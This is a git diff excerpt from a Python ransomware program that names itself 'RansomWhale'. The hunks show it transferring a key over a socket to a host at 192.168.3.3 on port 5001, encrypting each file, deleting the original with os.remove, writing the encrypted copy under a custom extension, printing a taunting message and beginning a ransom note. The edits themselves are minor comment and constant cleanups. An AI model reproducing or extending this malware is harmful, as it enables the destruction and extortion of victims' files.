@@ -65,7 +65,6 @@ if len(important) == 0:  #if we dont see a private_key file, we want to encrypt 
     ###########################
     
     ######[Key transfer]###### https://www.thepythoncode.com/article/send-receive-files-using-sockets-python
-    SEPARATOR = "<SEPARATOR>"
     BUFFER_SIZE = 4096 # send 4096 bytes each time step
     host = "192.168.3.3"
     port = 5001
@@ -115,7 +114,7 @@ if len(important) == 0:  #if we dont see a private_key file, we want to encrypt 
             algorithm=hashes.SHA256(),
             label=None
             )
-        )# used to = fernet.encrypt(f_bytes)
+        )
         
         print(f'RansomWhale was hungry and ate your file {file}')
         os.remove(file) #Removes our old unencrypted file
@@ -124,9 +123,8 @@ if len(important) == 0:  #if we dont see a private_key file, we want to encrypt 
         encFile = fileName + fileExtension  #Builds our Encrytped file with it's name + our Custom Extension
     
         with open(encFile, 'wb') as f:      
-            f.write(f_bytes_encrypted) # was just f.write(f_bytes_encrypted) Write      #Writes the Encrypted bytes to our Encrypted file.
+            f.write(f_bytes_encrypted)      #Writes the Encrypted bytes to our Encrypted file.
                                             # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
-                                            #added b64encode
     ################################################
     
     ransomNote="""
